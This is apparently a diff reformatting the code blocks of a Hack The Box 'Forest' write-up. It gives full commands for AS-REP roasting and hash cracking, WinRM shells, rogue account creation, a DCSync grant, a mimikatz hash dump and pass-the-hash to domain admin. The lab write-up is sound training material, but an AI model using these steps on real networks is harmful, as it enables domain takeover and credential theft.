@@ -18,7 +18,7 @@ It's been a while since I posted a writeup, and a machine I really enjoyed was r
 
 I always start a [hackthebox.eu](/forest/hackthebox.eu) machine by adding the hostname to my `/etc/hosts`. Here's the output of `nmap -sV -O -A -T5 -p- forest`
 
-```
+{{< highlight markdown >}}
 [*] Nmap: Nmap scan report for 10.10.10.161
 [*] Nmap: Host is up (0.068s latency).
 [*] Nmap: Not shown: 65511 closed ports
@@ -113,13 +113,13 @@ I always start a [hackthebox.eu](/forest/hackthebox.eu) machine by adding the ho
 [*] Nmap: OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 [*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 331.49 seconds
 [*] Nmap: Raw packets sent: 65734 (2.898MB) | Rcvd: 65654 (2.632MB)
-```
+{{< / highlight >}}
 
 Oh my, that is a lot of information. A few things are unusual here. There's LDAP, kerberos, and a kpasswd service, in addition to SMB services. This suggests that we just scanned a domain controller. We also have 5985 open, so we can use that to get a shell with `[evil-winrm](https://github.com/Hackplayers/evil-winrm)` eventually.
 
 I like to do my nmap scans from metasploit so I can them in the msf db. I also really like the services summary in msfconsole.
 
-```
+{{< highlight markdown >}}
 msf5 > services
 Services
 ========
@@ -150,11 +150,11 @@ host          port   proto  name          state  info
 10.10.10.161  49684  tcp    msrpc         open   Microsoft Windows RPC
 10.10.10.161  49698  tcp    msrpc         open   Microsoft Windows RPC
 10.10.10.161  49718  tcp    msrpc         open   Microsoft Windows RPC
-```
+{{< / highlight >}}
 
 Let's poke at LDAP and see what we can find
 
-```
+{{< highlight markdown >}}
 root@kali:[~/ctf/forest]:
 [Exit: 1] 20:23: nmap -p 389 forest --script ldap-rootdse
 Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-26 20:23 CST
@@ -201,21 +201,21 @@ PORT    STATE SERVICE
 Service Info: Host: FOREST; OS: Windows
 
 Nmap done: 1 IP address (1 host up) scanned in 0.81 seconds
-```
+{{< / highlight >}}
 
 Now we've confirmed this is a DC. Let's use that to our advantage.
 
 I found Impacket very useful for this box. Here's a [great intro to using Impacket](https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/). I mention it, because my next step was to enumerate users and my attempts to do that via ldap were not successful (doesn't mean it can't be done, just didn't work for me). So I started looking at Impacket and I was able to enumerate users via the SAMR pipe with 'samrdump.py'
 
-```
+{{< highlight markdown >}}
 root@kali:[~/src/impacket/examples]:(master %)
 [Exit: 0] 07:26: ./samrdump.py -debug -dc-ip 10.10.10.161 -target-ip 10.10.10.161 forest.htb.local | tee ~/ctf/forest/samrdump.py.out
 ...
-```
+{{< / highlight >}}
 
 From this output, we can build a list of users that actually exist easily with some simple UNIX fundamentals.
 
-```
+{{< highlight markdown >}}
 root@kali:[~/src/impacket/examples]:(master %)
 [Exit: 0 0 0] 07:31: awk '{print $1}'  ~/ctf/forest/samrdump.py.out   | sort |uniq | grep -P '\w+'
 $331000-VK4ADACQNUCA
@@ -251,7 +251,7 @@ SM_9b69f1b9d2cc45549
 SM_c75ee099d0a64c91b
 SM_ca8c2ed5bdab4dc9b
 svc-alfresco
-```
+{{< / highlight >}}
 
 ## Getting a Foothold / User Flag
 
@@ -263,7 +263,7 @@ Remember how I said Impacket would be important when we used it to build a list 
 
 So this is exactly where we are with forest. We can use the userlist we gathered to check if any of the accounts match the criteria that makes them vulnerable to this attack with another Impacket tool (GetNPUsers.py).
 
-```
+{{< highlight markdown >}}
 root@kali:[~/src/impacket/examples]:(master %)
 [Exit: 0] 22:16: ./GetNPUsers.py htb.local/ -usersfile ~/ctf/forest/users.txt -dc-ip 10.10.10.161 -format hashcat -outputfile hashes.asreproast
 Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation
@@ -303,21 +303,21 @@ root@kali:[~/src/impacket/examples]:(master %)
 $krb5asrep$23$svc-alfresco@HTB.LOCAL:e831e9a29eb858a0c3dda0b867380937$75bd5e5c9354e117bad4345ae9c2ebe751ebe728d493b004ca47d866338f70931f2b74163520cf365ba863e2838fe8cb777ba5edfcc3b57f8b9dc7df9aa46b9229226cd695f606e2fbd8c68da25ed5b6c3e906f3aec4aa47d3d55929a75de69573d31e2049b86d0d11bdaa612cb78a3404dcfa34ecfd5c28793bacb0ad0256acd2265075ebfcdf0172b4031c0098e08db042e205c15f41595707c93934d3000515af1fc67c2885f260f0180d43bf6c85e39454c7cdac427a0224355199e34fe45048cf83998a1a4bff52a45cc35a56ef8d8175baa7f7fd37490386c4a6fed17d9a4f205cec1a
 root@kali:[~/src/impacket/examples]:(master %)
 [Exit: 0] 22:19:
-```
+{{< / highlight >}}
 
 Now let's fire up hashcat and get this password.
 
-```
+{{< highlight markdown >}}
 notkali@gpu:[~/tmp]:
 [Exit: 0] 22:18: hashcat -m 18200 --force -a 0 hash ~/src/SecLists/Passwords/Leaked-Databases/rockyou.txt
 
 
 $krb5asrep$23$svc-alfresco@HTB.LOCAL:81301001ab2c010fdccd72827f025a77$cb4aaa6a0b1f6f2d2a3fcb7fb46f2cc119e8bb5e3837779206d900a07bd8d4c4f4e4315fff492a8b6c4e5b326e98027b242de4c087635410de9c2b5a33471c65c490a419b9d669d79c32d303f43a26654068f96d7ea13d6447e5bbd7d955a7d5143f3999ccd92a3ca3e099ca74ba4783c954e22f5a1ca810b5195be415ef98e0a9767c3d4586dd03df574a1620ac1ba317024e9f7382c202870b7ccbcd21c3cb58ba70b23bd2f1a81c62941c070530655d1da6dcb7e3a91f99924e0f78792659c62064a0dd0cd1b26864c214b947efd53bc8bbf6ba62bb7c943234908b03bc913f12b38ed688:s3rvice
-```
+{{< / highlight >}}
 
 We saw earlier that winrm is accessible, so let's get a shell as svc-alfresco with the password we cracked and see if we can get the user flag for this machine.
 
-```
+{{< highlight markdown >}}
 root@kali:[~/ctf/forest]:
 [Exit: 0 0] 22:37: evil-winrm -i forest -u'HTB\svc-alfresco' -p's3rvice' -s ~/src/PowerSploit/Privesc/
 
@@ -328,7 +328,7 @@ Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> cd ..\Desktop
 *Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> type user.txt
 e5e4e47a************************
-```
+{{< / highlight >}}
 
 [Excellent.](https://www.offensive-security.com/excellent.mp3)
 
@@ -336,7 +336,7 @@ e5e4e47a************************
 
 Once I had a foothold as the svc-alfresco user and started poking around, I quickly learned that this account, and others that existed when the machine was spawned seemed to be getting reset pretty frequently. This was making it challenging to do my enumeration to find a privesc, so I ended up creating a fresh user account and granting permission to that account so that I could continue.
 
-```
+{{< highlight markdown >}}
 # ricknmorty1 created with svc-alfresco acct! :)
 
 # This localgroup controls access to winrm, so add our user to it:
@@ -386,15 +386,15 @@ Global Group memberships     *Compliance Management*Exchange Windows Perm
                              *$D31000-NSEL5BRJ63V7 *ExchangeLegacyInterop
                              *Recipient Management *Delegated Setup
 The command completed successfully.
-```
+{{< / highlight >}}
 
 I knew that I wanted to run [AD Bloodhound](https://github.com/BloodHoundAD/BloodHound) to help me examine the AD structure, but I had been unable to get that working with the built in accounts. If you are unfamiliar with AD Bloodhound, check out ["How Attackers Use BloodHound To Get Active Directory Domain Admin Access"](https://mcpmag.com/articles/2019/11/13/bloodhound-active-directory-domain-admin.aspx). After creating `ricknmorty1` and adding that account to every domain group I could, as well as the local group that controls winrm access, I was finally able to get a shell as my new user and also run SharpHound to gather data that I would then feed into Bloodhound.
 
-```
+{{< highlight markdown >}}
 # Finally got Invoke-BloodHound to run locally. getting data remotely did not produce enough detail in bloodhound (maybe user error?).
 
 *Evil-WinRM* PS C:\Users\ricknmorty1\Documents> Invoke-BloodHound -DomainController forest.htb.local -LDAPUser ricknmorty1 -LDAPPass ricknmorty1 -CollectionMethod All -ZipFileName sh.zip -PrettyJson -JSONPrefix SH-data -Verbose  -StatusInterval 500 -Domain htb.local -SkipPing
-```
+{{< / highlight >}}
 
 After grabbing the data from SharpHound and loading it up in AD Bloodhound, I checked the built in query "Shortest path to Domain Admin".
 
@@ -406,7 +406,7 @@ Next, I reviewed the suggested path, and after drilling down on the crucial step
 
 The instructions did have a minor syntax wrinkle, but after reading the fine manual and using `get-help` 10,000 times (PowerShell is something I am working on improving), I managed to find the right syntax to grant DCSync.
 
-```
+{{< highlight markdown >}}
 *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Add-ObjectACL -PrincipalIdentity ricknmorty1 -Rights DCSync -Verbose
 Verbose: [Get-DomainSearcher] search base: LDAP://DC=htb,DC=local
 Verbose: [Get-DomainObject] Get-DomainObject filter string: (&(|(|(samAccountName=ricknmorty1)(name=ricknmorty1)(displayname=ricknmorty1))))
@@ -416,11 +416,11 @@ Verbose: [Add-DomainObjectAcl] Granting principal CN=ricknmorty1,CN=Users,DC=htb
 Verbose: [Add-DomainObjectAcl] Granting principal CN=ricknmorty1,CN=Users,DC=htb,DC=local rights GUID '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2' on DC=htb,DC=local
 ...
 *Evil-WinRM* PS C:\Users\svc-alfresco\Documents>
-```
+{{< / highlight >}}
 
 Now, in another terminal where I had an evil-winrm shell as `ricknmorty`, I was finally able to run mimikatz and grab the Domain Admin hash. The astute reader will see I also do the DCSync grant for `ricknmorty1` again just before running mimikatz. I saw a couple errors in the verbose output of the grant when I ran it as `svc-alfresco` so I thought a little extra insurance couldn't hurt.
 
-```
+{{< highlight markdown >}}
 *Evil-WinRM* PS C:\Users\ricknmorty1\Documents> Add-ObjectACL -PrincipalIdentity ricknmorty1 -Rights DCSync
 *Evil-WinRM* PS C:\Users\ricknmorty1\Documents> .\mimikatz.exe "lsadump::dcsync /domain:htb.local /user:Administrator" "exit"
 
@@ -455,11 +455,11 @@ Credentials:
 mimikatz(commandline) # exit
 Bye!
 *Evil-WinRM* PS C:\Users\ricknmorty1\Documents>
-```
+{{< / highlight >}}
 
 Now that we have the (Domain) Administrator hash, we can simply pass the hash and get a shell, and finally, grab the root flag.
 
-```
+{{< highlight markdown >}}
 root@kali:[~/www/mimikatz/x64]:
 [Exit: 1] 17:12: evil-winrm -u'Administrator' -H'32693b11************************'   -i forest
 
@@ -547,7 +547,7 @@ f048153f************************
 
 *Evil-WinRM* PS C:\Users\Administrator\Documents> hostname
 FOREST
-```
+{{< / highlight >}}
 
 I also added `ricknmorty1` to "Domain Admins" for fun.
 
